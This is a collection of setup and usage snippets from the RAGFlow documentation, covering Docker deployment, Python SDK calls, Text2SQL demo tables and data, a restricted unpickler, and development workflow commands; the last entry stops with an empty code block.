TITLE: Starting RAGFlow Server with Docker Compose
DESCRIPTION: Commands to start the RAGFlow server using pre-built Docker images, with options for CPU or GPU acceleration.

LANGUAGE: bash
CODE:
$ cd ragflow/docker
# Use CPU for embedding and DeepDoc tasks:
$ docker compose -f docker-compose.yml up -d

# To use GPU to accelerate embedding and DeepDoc tasks:
# docker compose -f docker-compose-gpu.yml up -d

----------------------------------------

TITLE: Checking and Setting vm.max_map_count on Linux
DESCRIPTION: Commands to check and set the vm.max_map_count value on Linux systems, which is crucial for Elasticsearch functioning in RAGFlow.

LANGUAGE: bash
CODE:
$ sysctl vm.max_map_count
$ sudo sysctl -w vm.max_map_count=262144

----------------------------------------

TITLE: Cloning and Running RAGFlow Server
DESCRIPTION: Commands to clone the repository and start the RAGFlow server using Docker Compose

LANGUAGE: bash
CODE:
$ git clone https://github.com/infiniflow/ragflow.git
$ cd ragflow/docker
$ docker compose -f docker-compose.yml up -d

----------------------------------------

TITLE: Checking RAGFlow Server Status
DESCRIPTION: Command to check the status of the RAGFlow server after startup.

LANGUAGE: bash
CODE:
$ docker logs -f ragflow-server

----------------------------------------

TITLE: Creating Chat Assistant Example
DESCRIPTION: Example showing how to create a new chat assistant

LANGUAGE: python
CODE:
from ragflow_sdk import RAGFlow

rag_object = RAGFlow(api_key="<YOUR_API_KEY>", base_url="http://<YOUR_BASE_URL>:9380")
datasets = rag_object.list_datasets(name="kb_1")
dataset_ids = []
for dataset in datasets:
    dataset_ids.append(dataset.id)
assistant = rag_object.create_chat("Miss R", dataset_ids=dataset_ids)

----------------------------------------

TITLE: Creating Dataset Example
DESCRIPTION: Example of creating a new dataset using the RAGFlow SDK

LANGUAGE: python
CODE:
from ragflow_sdk import RAGFlow

rag_object = RAGFlow(api_key="<YOUR_API_KEY>", base_url="http://<YOUR_BASE_URL>:9380")
dataset = rag_object.create_dataset(name="kb_1")

----------------------------------------

TITLE: Uploading Documents Example
DESCRIPTION: Example demonstrating how to upload documents to a dataset

LANGUAGE: python
CODE:
dataset = rag_object.create_dataset(name="kb_name")
dataset.upload_documents([{"display_name": "1.txt", "blob": "<BINARY_CONTENT_OF_THE_DOC>"}, {"display_name": "2.pdf", "blob": "<BINARY_CONTENT_OF_THE_DOC>"}])

----------------------------------------

TITLE: Creating OpenAI Chat Completion
DESCRIPTION: Example showing how to create a chat completion using RAGFlow's OpenAI-compatible API endpoint

LANGUAGE: python
CODE:
from openai import OpenAI

model = "model"
client = OpenAI(api_key="ragflow-api-key", base_url=f"http://ragflow_address/api/v1/chats_openai/<chat_id>")

completion = client.chat.completions.create(
    model=model,
    messages=[
        {"role": "system", "content": "You are a helpful assistant."}, 
        {"role": "user", "content": "Who are you?"}
    ],
    stream=True
)

stream = True
if stream:
    for chunk in completion:
        print(chunk)
else:
    print(completion.choices[0].message.content)

----------------------------------------

TITLE: Starting RAGFlow Server with Docker Compose
DESCRIPTION: Docker Compose commands to start the RAGFlow server using CPU or GPU.

LANGUAGE: bash
CODE:
# Use CPU for embedding and DeepDoc tasks:
$ docker compose -f docker-compose.yml up -d

# To use GPU to accelerate embedding and DeepDoc tasks:
# docker compose -f docker-compose-gpu.yml up -d

----------------------------------------

TITLE: Initializing Ollama with IPEX-LLM
DESCRIPTION: Commands to initialize Ollama with IPEX-LLM on Linux and Windows systems.

LANGUAGE: bash
CODE:
conda activate llm-cpp
init-ollama

LANGUAGE: cmd
CODE:
conda activate llm-cpp
init-ollama.bat

----------------------------------------

TITLE: Restarting Docker Containers for RAGFlow
DESCRIPTION: Command to restart all Docker containers after making configuration changes to RAGFlow.

LANGUAGE: bash
CODE:
docker compose -f docker/docker-compose.yml up -d

----------------------------------------

TITLE: Environment Variables Configuration
DESCRIPTION: Environment variable configurations for RAGFlow services including Elasticsearch, Kibana, MySQL, MinIO, Redis and core RAGFlow settings.

LANGUAGE: env
CODE:
STACK_VERSION=8.11.3
ES_PORT=1200
KIBANA_PORT=6601
KIBANA_USER=rag_flow
KIBANA_PASSWORD=infini_rag_flow
MEM_LIMIT=8073741824
MYSQL_PORT=5455
MINIO_CONSOLE_PORT=9001
MINIO_PORT=9000
REDIS_PORT=6379
SVR_HTTP_PORT=9380

----------------------------------------

TITLE: Installing RAGFlow Python SDK
DESCRIPTION: Command to install the RAGFlow Python SDK version 0.13.0 using pip

LANGUAGE: bash
CODE:
pip install ragflow-sdk==0.13.0

----------------------------------------

TITLE: Adding URL Metadata in JSON Format
DESCRIPTION: Example of adding metadata to HTML files to include source URL information that the LLM can use for citations. The metadata must be in valid JSON format for successful application.

LANGUAGE: json
CODE:
{
  "url": "https://example.com/source-document"
}

----------------------------------------

TITLE: Configuring LLM API Key in YAML Configuration
DESCRIPTION: Example YAML configuration showing where to set the LLM factory name, API key, and base URL in the service_conf.yaml.template file.

LANGUAGE: yaml
CODE:
user_default_llm:
  factory: your_chosen_llm
  api_key: your_api_key
  base_url: your_proxy_url_if_needed

----------------------------------------

TITLE: Rendering API Support Table in MDX
DESCRIPTION: MDX code block for rendering a table showing RAGFlow's supported model providers and their capabilities across different AI tasks. The table uses checkmarks to indicate supported features for each provider.

LANGUAGE: mdx
CODE:
<APITable>
| Provider              | Chat               | Embedding          | Rerank             | Img2txt            | Speech2txt         | TTS                |
| --------------------- | ------------------ | ------------------ | ------------------ | ------------------ | ------------------ | ------------------ |
| Anthropic             | :heavy_check_mark: |                    |                    |                    |                    |                    |
| Azure-OpenAI          | :heavy_check_mark: | :heavy_check_mark: |                    | :heavy_check_mark: | :heavy_check_mark: |                    |
| BAAI                  |                    | :heavy_check_mark: | :heavy_check_mark: |                    |                    |                    |
[...additional rows omitted for brevity...]
| ZHIPU-AI              | :heavy_check_mark: | :heavy_check_mark: |                    | :heavy_check_mark: |                    |                    |
| 01.AI                 | :heavy_check_mark: |                    |                    |                    |                    |                    |
</APITable>

----------------------------------------

TITLE: Creating Database Tables for Text2SQL Agent
DESCRIPTION: SQL statements to create the necessary tables (Customers, Products, Orders, OrderDetails) for the Text2SQL agent demo.

LANGUAGE: sql
CODE:
SET NAMES utf8mb4;

-- ----------------------------
-- Table structure for Customers
-- ----------------------------
DROP TABLE IF EXISTS `Customers`;
CREATE TABLE `Customers` (
  `CustomerID` int NOT NULL AUTO_INCREMENT,
  `UserName` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `Email` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `PhoneNumber` varchar(20) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`CustomerID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- ----------------------------
-- Table structure for Products
-- ----------------------------
DROP TABLE IF EXISTS `Products`;
CREATE TABLE `Products` (
  `ProductID` int NOT NULL AUTO_INCREMENT,
  `ProductName` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `Description` text COLLATE utf8mb4_unicode_ci,
  `Price` decimal(10,2) DEFAULT NULL,
  `StockQuantity` int DEFAULT NULL,
  PRIMARY KEY (`ProductID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- ----------------------------
-- Table structure for Orders
-- ----------------------------
DROP TABLE IF EXISTS `Orders`;
CREATE TABLE `Orders` (
  `OrderID` int NOT NULL AUTO_INCREMENT,
  `CustomerID` int DEFAULT NULL,
  `OrderDate` date DEFAULT NULL,
  `TotalPrice` decimal(10,2) DEFAULT NULL,
  PRIMARY KEY (`OrderID`),
  KEY `CustomerID` (`CustomerID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- ----------------------------
-- Table structure for OrderDetails
-- ----------------------------
DROP TABLE IF EXISTS `OrderDetails`;
CREATE TABLE `OrderDetails` (
  `OrderDetailID` int NOT NULL AUTO_INCREMENT,
  `OrderID` int DEFAULT NULL,
  `ProductID` int DEFAULT NULL,
  `UnitPrice` decimal(10,2) DEFAULT NULL,
  `Quantity` int DEFAULT NULL,
  `TotalPrice` decimal(10,2) DEFAULT NULL,
  PRIMARY KEY (`OrderDetailID`),
  KEY `OrderID` (`OrderID`),
  KEY `ProductID` (`ProductID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

----------------------------------------

TITLE: Implementing Restricted Unpickler for Security in Python
DESCRIPTION: This code snippet defines a RestrictedUnpickler class and a restricted_loads function to limit unpickling to safe modules. It aims to enhance security by preventing arbitrary code execution during deserialization.

LANGUAGE: python
CODE:
import builtins
import io
import pickle

safe_module = {
    'numpy',
    'rag_flow'
}


class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        import importlib
        if module.split('.')[0] in safe_module:
            _module = importlib.import_module(module)
            return getattr(_module, name)
        # Forbid everything else.
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" %
                                     (module, name))


def restricted_loads(src):
    """Helper function analogous to pickle.loads()."""
    return RestrictedUnpickler(io.BytesIO(src)).load()

----------------------------------------

TITLE: Defining System Prompt with Variables for Translation Task
DESCRIPTION: Example system prompt template for a translation reflection task, demonstrating the use of variables within XML tags to structure input data for the LLM.

LANGUAGE: text
CODE:
Your task is to read a source text and a translation to {target_lang}, and give constructive suggestions to improve the translation. The source text and initial translation, delimited by XML tags <SOURCE_TEXT></SOURCE_TEXT> and <TRANSLATION></TRANSLATION>, are as follows:

<SOURCE_TEXT>
{source_text}
</SOURCE_TEXT>

<TRANSLATION>
{translation_1}
</TRANSLATION>

When writing suggestions, pay attention to whether there are ways to improve the translation's fluency, by applying {target_lang} grammar, spelling and punctuation rules, and ensuring there are no unnecessary repetitions.
- Each suggestion should address one specific part of the translation.
- Output the suggestions only.

----------------------------------------

TITLE: Launching RAGFlow Backend Service
DESCRIPTION: Commands to run the entrypoint script and start the RAGFlow backend service using Python.

LANGUAGE: shell
CODE:
JEMALLOC_PATH=$(pkg-config --variable=libdir jemalloc)/libjemalloc.so;
LD_PRELOAD=$JEMALLOC_PATH python rag/svr/task_executor.py 1;

LANGUAGE: shell
CODE:
python api/ragflow_server.py;

----------------------------------------

TITLE: Pulling Ollama Models
DESCRIPTION: Commands to pull specific models (llama3.2 and bge-m3) using Ollama in Docker.

LANGUAGE: bash
CODE:
sudo docker exec ollama ollama pull llama3.2
sudo docker exec ollama ollama pull bge-m3

----------------------------------------

TITLE: Starting RAGFlow Frontend Service
DESCRIPTION: Command to start the RAGFlow frontend service using npm.

LANGUAGE: bash
CODE:
npm run dev

----------------------------------------

TITLE: Installing Frontend Dependencies
DESCRIPTION: Commands to navigate to the web directory and install frontend dependencies using npm.

LANGUAGE: bash
CODE:
cd web
npm install

----------------------------------------

TITLE: Configuring TextSQL_Thesaurus Knowledge Base for Text2SQL Agent
DESCRIPTION: Text file containing synonyms for domain-specific terms used in the Text2SQL agent.

LANGUAGE: plaintext
CODE:
###
Standard noun: StockQuantity
Synonyms: stock,stockpile,inventory
###
Standard noun: UserName
Synonyms: user name, user's name
###
Standard noun: Quantity
Synonyms: amount,number
###
Standard noun: Smartphone
Synonyms: phone, mobile phone, smart phone, mobilephone
###
Standard noun: ProductName
Synonyms: product name, product's name
###
Standard noun: tablet
Synonyms: pad,Pad
###
Standard noun: laptop
Synonyms: laptop computer,laptop pc

----------------------------------------

TITLE: Configuring LLM Prompt for Text2SQL Agent
DESCRIPTION: Additional prompt content to provide thesaurus information to the LLM for generating SQL queries.

LANGUAGE: plaintext
CODE:
## You may use the following Thesaurus statements. For example, what I ask is from Synonyms, you must use Standard noun to generate SQL. Use responses to past questions also to guide you: {sql_thesaurus}.

----------------------------------------

TITLE: Setting RAGFlow Nightly-Slim Image
DESCRIPTION: Environment configuration for using the nightly-slim Docker image without embedding models.

LANGUAGE: bash
CODE:
RAGFLOW_IMAGE=infiniflow/ragflow:nightly-slim

----------------------------------------

TITLE: Installing RAGFlow Python SDK
DESCRIPTION: Command to install the RAGFlow Python SDK package via pip

LANGUAGE: bash
CODE:
pip install ragflow-sdk

----------------------------------------

TITLE: Setting vm.max_map_count on macOS with Docker Desktop
DESCRIPTION: Command to update vm.max_map_count on macOS systems running Docker Desktop.

LANGUAGE: bash
CODE:
docker run --rm --privileged --pid=host alpine sysctl -w vm.max_map_count=262144

----------------------------------------

TITLE: Setting vm.max_map_count on Windows with Docker Desktop
DESCRIPTION: Commands to set vm.max_map_count on Windows systems running Docker Desktop.

LANGUAGE: bash
CODE:
$ docker-machine ssh
$ sudo sysctl -w vm.max_map_count=262144

----------------------------------------

TITLE: Cloning RAGFlow Repository and Checking Out Version
DESCRIPTION: Git commands to clone the RAGFlow repository and check out a specific version.

LANGUAGE: bash
CODE:
$ git clone https://github.com/infiniflow/ragflow.git
$ cd ragflow/docker
$ git checkout -f v0.17.2

----------------------------------------

TITLE: Docker Volume Configuration
DESCRIPTION: Example of Docker volume configuration for mounting local deepdoc resources

LANGUAGE: yaml
CODE:
- ~/deepdoc:/ragflow/rag/res/deepdoc

----------------------------------------

TITLE: Updating /etc/hosts for Service Resolution
DESCRIPTION: Command to add an entry to /etc/hosts file for resolving service hostnames to localhost.

LANGUAGE: bash
CODE:
127.0.0.1       es01 infinity mysql minio redis

----------------------------------------

TITLE: Setting Specific RAGFlow Version Image
DESCRIPTION: Environment configuration for using a specific version of the RAGFlow Docker image.

LANGUAGE: bash
CODE:
RAGFLOW_IMAGE=infiniflow/ragflow:v0.17.2

----------------------------------------

TITLE: Launching RAGFlow Backend Service for Development
DESCRIPTION: Commands to launch the RAGFlow backend service from source for development, including setting up the environment and starting the service.

LANGUAGE: bash
CODE:
source .venv/bin/activate
export PYTHONPATH=$(pwd)
bash docker/launch_backend_service.sh

----------------------------------------

TITLE: Instalando Dependências e Iniciando Serviços para Desenvolvimento
DESCRIPTION: Série de comandos para configurar um ambiente de desenvolvimento, incluindo instalação de dependências e inicialização de serviços.

LANGUAGE: bash
CODE:
pipx install uv

git clone https://github.com/infiniflow/ragflow.git
cd ragflow/
uv sync --python 3.10 --all-extras

docker compose -f docker/docker-compose-base.yml up -d

export HF_ENDPOINT=https://hf-mirror.com

source .venv/bin/activate
export PYTHONPATH=$(pwd)
bash docker/launch_backend_service.sh

cd web
npm install
npm run dev

----------------------------------------

TITLE: Building RAGFlow Docker Image With Embedding Models
DESCRIPTION: Commands to build a full-featured (~9GB) RAGFlow Docker image that includes embedding models. Only relies on external LLM services.

LANGUAGE: bash
CODE:
git clone https://github.com/infiniflow/ragflow.git
cd ragflow/
uv run download_deps.py
docker build -f Dockerfile.deps -t infiniflow/ragflow_deps .
docker build -f Dockerfile -t infiniflow/ragflow:nightly .

----------------------------------------

TITLE: Running TSR Processing Command
DESCRIPTION: Example command for running table structure recognition with specific settings

LANGUAGE: bash
CODE:
python deepdoc/vision/t_recognizer.py --inputs=path_to_images_or_pdfs --threshold=0.2 --mode=tsr --output_dir=path_to_store_result

----------------------------------------

TITLE: Cloning RAGFlow Repository in Bash
DESCRIPTION: Command to clone the forked RAGFlow repository to the local machine. This is the first step in the contribution workflow after forking the repository on GitHub.

LANGUAGE: bash
CODE:
git clone git@github.com:<yourname>/ragflow.git

----------------------------------------

TITLE: Activating Python Virtual Environment
DESCRIPTION: Commands to activate the Python virtual environment and set the PYTHONPATH.

LANGUAGE: bash
CODE:
source .venv/bin/activate
export PYTHONPATH=$(pwd)

----------------------------------------

TITLE: Creating Persistent vm.max_map_count Settings on macOS
DESCRIPTION: Steps to create a file with persistent vm.max_map_count settings on macOS.

LANGUAGE: bash
CODE:
sudo nano /Library/LaunchDaemons/com.user.vmmaxmap.plist
sudo launchctl load /Library/LaunchDaemons/com.user.vmmaxmap.plist

LANGUAGE: xml
CODE:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.user.vmmaxmap</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/sbin/sysctl</string>
        <string>-w</string>
        <string>vm.max_map_count=262144</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>

----------------------------------------

TITLE: Configuring ChatGPT-on-WeChat for WeChat Channel in JSON
DESCRIPTION: Example configuration for the ChatGPT-on-WeChat root config.json file, specifically for setting up the WeChat channel. It includes essential parameters like app ID, secret, token, and port.

LANGUAGE: json
CODE:
{
  "channel_type": "wechatmp",
  "wechatmp_app_id": "YOUR_APP_ID",
  "wechatmp_app_secret": "YOUR_APP_SECRET",
  "wechatmp_token": "YOUR_TOKEN",
  "wechatmp_port": 80,
  ...
}

----------------------------------------

TITLE: Checking RAGFlow Server Status
DESCRIPTION: Command to check the status of the RAGFlow server by viewing Docker logs.

LANGUAGE: bash
CODE:
$ docker logs -f ragflow-server

----------------------------------------

TITLE: Chrome Extension Directory Structure
DESCRIPTION: The complete directory structure of the Chrome extension project showing all necessary files and folders including manifest, scripts, styles, and assets. Each file's purpose is documented in the comments.

LANGUAGE: plaintext
CODE:
chrome-extension/
│
├── manifest.json         # Main configuration file for the extension
├── popup.html          # Main user interface of the extension
├── popup.js            # Script for the main interface
├── background.js       # Background script for the extension
├── content.js          # Script to interact with web pages
├── styles/
│   └── popup.css       # CSS file for the popup
├── icons/
│   ├── icon16.png      # 16x16 pixel icon
│   ├── icon48.png      # 48x48 pixel icon
│   └── icon128.png     # 128x128 pixel icon
├── assets/
│   └── ...             # Directory for other assets (images, fonts, etc.)
├── scripts/
│   ├── utils.js        # File containing utility functions
│   └── api.js          # File containing API call logic
└── README.md           # Instructions for using and installing the extension

----------------------------------------

TITLE: Building RAGFlow Docker Image with Embedding Models
DESCRIPTION: Commands to build a full Docker image of RAGFlow including embedding models, resulting in a 9GB image size.

LANGUAGE: bash
CODE:
git clone https://github.com/infiniflow/ragflow.git
cd ragflow/
docker build -f Dockerfile -t infiniflow/ragflow:nightly .

----------------------------------------

TITLE: Running OCR Processing Command
DESCRIPTION: Example command for running OCR processing on document inputs with output directory specification

LANGUAGE: bash
CODE:
python deepdoc/vision/t_ocr.py --inputs=path_to_images_or_pdfs --output_dir=path_to_store_result

----------------------------------------

TITLE: Installing RAGFlow Dependencies for Development
DESCRIPTION: Commands to install uv and RAGFlow Python dependencies for development purposes.

LANGUAGE: bash
CODE:
pipx install uv
git clone https://github.com/infiniflow/ragflow.git
cd ragflow/
uv sync --python 3.10 --all-extras

----------------------------------------

TITLE: Building and Publishing ragflow-sdk Python Package to PyPI
DESCRIPTION: This shell script builds the ragflow-sdk package using uv, installs twine for package uploading, sets up PyPI authentication using an API token, and uploads the built wheel file to PyPI. It requires uv to be installed and a valid PyPI API token.

LANGUAGE: shell
CODE:
uv build
uv pip install twine
export TWINE_USERNAME="__token__"
export TWINE_PASSWORD=$YOUR_PYPI_API_TOKEN
twine upload dist/*.whl

----------------------------------------

TITLE: Generating Test Data for Text2SQL Agent
DESCRIPTION: SQL statements to insert test data into the Customers, Products, Orders, and OrderDetails tables for the Text2SQL agent demo.

LANGUAGE: sql
CODE:
START TRANSACTION;
INSERT INTO Customers (UserName, Email, PhoneNumber) VALUES
('Alice', 'alice@example.com', '123456789'),
('Bob', 'bob@example.com', '987654321'),
('Charlie', 'charlie@example.com', '112233445'),
('Diana', 'diana@example.com', '555666777'),
('Eve', 'eve@example.com', '999888777'),
('Frank', 'frank@example.com', '123123123'),
('Grace', 'grace@example.com', '456456456'),
('Hugo', 'hugo@example.com', '789789789'),
('Ivy', 'ivy@example.com', '321321321'),
('Jack', 'jack@example.com', '654654654');

INSERT INTO Products (ProductName, Description, Price, StockQuantity) VALUES
('Laptop', 'High performance laptop', 1200.00, 50),
('Smartphone', 'Latest model smartphone', 800.00, 100),
('Tablet', 'Portable tablet device', 300.00, 75),
('Headphones', 'Noise-cancelling headphones', 150.00, 200),
('Camera', 'Professional camera', 600.00, 30),
('Monitor', '24-inch Full HD monitor', 200.00, 45),
('Keyboard', 'Mechanical keyboard', 100.00, 150),
('Mouse', 'Ergonomic gaming mouse', 50.00, 250),
('Speaker', 'Wireless Bluetooth speaker', 80.00, 120),
('Router', 'Wi-Fi router with high speed', 120.00, 90);

INSERT INTO Orders (CustomerID, OrderDate, TotalPrice) VALUES
(1, '2024-01-15', 0),
(2, '2024-02-01', 0),
(3, '2024-03-05', 0),
(4, '2024-04-10', 0),
(5, '2024-05-15', 0),
(6, '2024-06-20', 0),
(7, '2024-07-25', 0),
(8, '2024-08-30', 0),
(9, '2024-09-05', 0),
(10, '2024-10-10', 0),
(1, '2024-11-15', 0),
(2, '2024-12-01', 0),
(3, '2024-01-05', 0),
(4, '2024-02-10', 0),
(5, '2024-03-15', 0),
(6, '2024-04-20', 0),
(7, '2024-05-25', 0),
(8, '2024-06-30', 0),
(9, '2024-07-05', 0),
(10, '2024-08-10', 0);

INSERT INTO OrderDetails (OrderID, ProductID, UnitPrice, Quantity, TotalPrice) VALUES
(1, 1, (SELECT Price FROM Products WHERE ProductID = 1), 2, (SELECT Price * 2 FROM Products WHERE ProductID = 1)), 
(1, 2, (SELECT Price FROM Products WHERE ProductID = 2), 1, (SELECT Price FROM Products WHERE ProductID = 2)),
(2, 3, (SELECT Price FROM Products WHERE ProductID = 3), 3, (SELECT Price * 3 FROM Products WHERE ProductID = 3)),
(2, 4, (SELECT Price FROM Products WHERE ProductID = 4), 1, (SELECT Price FROM Products WHERE ProductID = 4)),
(3, 5, (SELECT Price FROM Products WHERE ProductID = 5), 1, (SELECT Price FROM Products WHERE ProductID = 5)),
(3, 6, (SELECT Price FROM Products WHERE ProductID = 6), 2, (SELECT Price * 2 FROM Products WHERE ProductID = 6)),
(4, 7, (SELECT Price FROM Products WHERE ProductID = 7), 5, (SELECT Price * 5 FROM Products WHERE ProductID = 7)),
(5, 8, (SELECT Price FROM Products WHERE ProductID = 8), 3, (SELECT Price * 3 FROM Products WHERE ProductID = 8)),
(5, 9, (SELECT Price FROM Products WHERE ProductID = 9), 2, (SELECT Price * 2 FROM Products WHERE ProductID = 9)),
(6, 10, (SELECT Price FROM Products WHERE ProductID = 10), 4, (SELECT Price * 4 FROM Products WHERE ProductID = 10)),
(7, 2, (SELECT Price FROM Products WHERE ProductID = 2), 4, (SELECT Price * 4 FROM Products WHERE ProductID = 2)),
(7, 8, (SELECT Price FROM Products WHERE ProductID = 8), 3, (SELECT Price * 3 FROM Products WHERE ProductID = 8)),
(8, 1, (SELECT Price FROM Products WHERE ProductID = 1), 1, (SELECT Price FROM Products WHERE ProductID = 1)),
(8, 9, (SELECT Price FROM Products WHERE ProductID = 9), 2, (SELECT Price * 2 FROM Products WHERE ProductID = 9)),
(8, 10, (SELECT Price FROM Products WHERE ProductID = 10), 5, (SELECT Price * 5 FROM Products WHERE ProductID = 10)),
(9, 3, (SELECT Price FROM Products WHERE ProductID = 3), 5, (SELECT Price * 5 FROM Products WHERE ProductID = 3)),
(9, 6, (SELECT Price FROM Products WHERE ProductID = 6), 1, (SELECT Price FROM Products WHERE ProductID = 6)),
(10, 4, (SELECT Price FROM Products WHERE ProductID = 4), 2, (SELECT Price * 2 FROM Products WHERE ProductID = 4)),
(10, 7, (SELECT Price FROM Products WHERE ProductID = 7), 3, (SELECT Price * 3 FROM Products WHERE ProductID = 7)),
(11, 5, (SELECT Price FROM Products WHERE ProductID = 5), 1, (SELECT Price FROM Products WHERE ProductID = 5)),
(11, 10, (SELECT Price FROM Products WHERE ProductID = 10), 4, (SELECT Price * 4 FROM Products WHERE ProductID = 10)),
(12, 1, (SELECT Price FROM Products WHERE ProductID = 1), 3, (SELECT Price * 3 FROM Products WHERE ProductID = 1)),
(12, 8, (SELECT Price FROM Products WHERE ProductID = 8), 2, (SELECT Price * 2 FROM Products WHERE ProductID = 8)),
(13, 2, (SELECT Price FROM Products WHERE ProductID = 2), 1, (SELECT Price FROM Products WHERE ProductID = 2)),
(13, 9, (SELECT Price FROM Products WHERE ProductID = 9), 3, (SELECT Price * 3 FROM Products WHERE ProductID = 9)),
(14, 3, (SELECT Price FROM Products WHERE ProductID = 3), 4, (SELECT Price * 4 FROM Products WHERE ProductID = 3)),
(14, 6, (SELECT Price FROM Products WHERE ProductID = 6), 2, (SELECT Price * 2 FROM Products WHERE ProductID = 6)),
(15, 4, (SELECT Price FROM Products WHERE ProductID = 4), 5, (SELECT Price * 5 FROM Products WHERE ProductID = 4)),
(15, 7, (SELECT Price FROM Products WHERE ProductID = 7), 1, (SELECT Price FROM Products WHERE ProductID = 7)),
(16, 5, (SELECT Price FROM Products WHERE ProductID = 5), 2, (SELECT Price * 2 FROM Products WHERE ProductID = 5)),
(16, 10, (SELECT Price FROM Products WHERE ProductID = 10), 3, (SELECT Price * 3 FROM Products WHERE ProductID = 10)),
(17, 1, (SELECT Price FROM Products WHERE ProductID = 1), 4, (SELECT Price * 4 FROM Products WHERE ProductID = 1)),
(17, 8, (SELECT Price FROM Products WHERE ProductID = 8), 1, (SELECT Price FROM Products WHERE ProductID = 8)),
(18, 2, (SELECT Price FROM Products WHERE ProductID = 2), 5, (SELECT Price * 5 FROM Products WHERE ProductID = 2)),
(18, 9, (SELECT Price FROM Products WHERE ProductID = 9), 2, (SELECT Price * 2 FROM Products WHERE ProductID = 9)),
(19, 3, (SELECT Price FROM Products WHERE ProductID = 3), 3, (SELECT Price * 3 FROM Products WHERE ProductID = 3)),
(19, 6, (SELECT Price FROM Products WHERE ProductID = 6), 4, (SELECT Price * 4 FROM Products WHERE ProductID = 6)),
(20, 4, (SELECT Price FROM Products WHERE ProductID = 4), 1, (SELECT Price FROM Products WHERE ProductID = 4)),
(20, 7, (SELECT Price FROM Products WHERE ProductID = 7), 5, (SELECT Price * 5 FROM Products WHERE ProductID = 7));

-- Update Orders Table's TotalPrice
UPDATE Orders o
JOIN (
    SELECT OrderID, SUM(TotalPrice) as order_total
    FROM OrderDetails
    GROUP BY OrderID
) od ON o.OrderID = od.OrderID
SET o.TotalPrice = od.order_total;

COMMIT;

----------------------------------------

TITLE: Building RAGFlow Docker Image without Embedding Models
DESCRIPTION: Commands to build a slim Docker image of RAGFlow without embedding models, resulting in a 2GB image size.

LANGUAGE: bash
CODE:
git clone https://github.com/infiniflow/ragflow.git
cd ragflow/
docker build --build-arg LIGHTEN=1 -f Dockerfile -t infiniflow/ragflow:nightly-slim .

----------------------------------------

TITLE: Creating Local Branch in Bash
DESCRIPTION: Command to create a new local branch for making changes. This isolates the development work from the main branch.

LANGUAGE: bash
CODE:
git checkout -b my-branch

----------------------------------------

TITLE: HuggingFace Endpoint Configuration
DESCRIPTION: Environment variable setting for configuring alternative HuggingFace model download endpoint

LANGUAGE: bash
CODE:
export HF_ENDPOINT=https://hf-mirror.com

----------------------------------------

TITLE: Committing Changes in Bash
DESCRIPTION: Command to commit changes to the local branch with a descriptive message. The message should provide sufficient information about the changes made.

LANGUAGE: bash
CODE:
git commit -m 'Provide sufficient info in your commit message'

----------------------------------------

TITLE: Stopping RAGFlow Services
DESCRIPTION: Commands to stop the RAGFlow frontend and backend services when development is complete.

LANGUAGE: bash
CODE:
pkill npm

LANGUAGE: bash
CODE:
pkill -f "docker/entrypoint.sh"

----------------------------------------

TITLE: Rendering API Table in MDX for Question Answering Timing Components
DESCRIPTION: This code snippet uses a custom APITable component to display a table of timing components in the question answering process. It includes item names and descriptions for various stages such as LLM validation, retriever creation, and answer generation.

LANGUAGE: mdx
CODE:
```mdx-code-block
<APITable>
```

| Item name         | Description                                                                                   |
| ----------------- | --------------------------------------------------------------------------------------------- |
| Total             | Total time spent on this conversation round, including chunk retrieval and answer generation. |
| Check LLM         | Time to validate the specified LLM.                                                           |
| Create retriever  | Time to create a chunk retriever.                                                             |
| Bind embedding    | Time to initialize an embedding model instance.                                               |
| Bind LLM          | Time to initialize an LLM instance.                                                           |
| Tune question     | Time to optimize the user query using the context of the mult-turn conversation.              |
| Bind reranker     | Time to initialize an reranker model instance for chunk retrieval.                            |
| Generate keywords | Time to extract keywords from the user query.                                                 |
| Retrieval         | Time to retrieve the chunks.                                                                  |
| Generate answer   | Time to generate the answer.                                                                  |

```mdx-code-block
</APITable>
```

----------------------------------------

TITLE: Displaying RAGFlow Version Information
DESCRIPTION: Shows the RAGFlow version number in system logs, including version components like release number, commit count, and edition type.

LANGUAGE: text
CODE:
        ____   ___    ______ ______ __               
       / __ \ /   |  / ____// ____// /____  _      __
      / /_/ // /| | / / __ / /_   / // __ \| | /| / /
     / _, _// ___ |/ /_/ // __/  / // /_/ /| |/ |/ / 
    /_/ |_|/_/  |_|\____//_/    /_/ \____/ |__/|__/                             

2025-02-18 10:10:43,835 INFO     1445658 RAGFlow version: v0.15.0-50-g6daae7f2 full

----------------------------------------

TITLE: Deleting Datasets Example
DESCRIPTION: Example of deleting datasets by their IDs

LANGUAGE: python
CODE:
rag_object.delete_datasets(ids=["id_1","id_2"])

----------------------------------------

TITLE: Launching Ollama Service with IPEX-LLM
DESCRIPTION: Commands to set environment variables and launch Ollama service with IPEX-LLM on Linux and Windows.

LANGUAGE: bash
CODE:
export OLLAMA_NUM_GPU=999
export no_proxy=localhost,127.0.0.1
export ZES_ENABLE_SYSMAN=1
source /opt/intel/oneapi/setvars.sh
export SYCL_CACHE_PERSISTENT=1

./ollama serve

LANGUAGE: cmd
CODE:
set OLLAMA_NUM_GPU=999
set no_proxy=localhost,127.0.0.1
set ZES_ENABLE_SYSMAN=1
set SYCL_CACHE_PERSISTENT=1

ollama serve

----------------------------------------

TITLE: Launching Third-party Services with Docker Compose
DESCRIPTION: Command to start base services (MinIO, Elasticsearch, Redis, and MySQL) using Docker Compose.

LANGUAGE: bash
CODE:
